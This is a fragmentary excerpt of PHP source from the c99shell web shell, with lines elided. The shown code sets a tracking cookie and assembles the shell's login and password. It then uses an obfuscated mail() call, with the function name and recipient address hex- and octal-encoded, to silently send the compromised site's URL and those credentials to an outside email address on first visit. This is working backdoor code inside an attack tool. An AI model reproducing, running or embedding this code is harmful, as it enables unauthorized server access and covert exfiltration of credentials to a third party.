...
@setcookie("c99shell","c99",time() +3600*24*7);
...
$cnt="us:$login\nps:$pass\npse:$md5_pass";//position using cookies.
...
//  )
//   {command}: %f% = filename
$zx="m\141\151l";$wi=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];
...
if (!isset($_COOKIE['c99shell'])){@$zx("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$wi","$wi\n$cnt");}
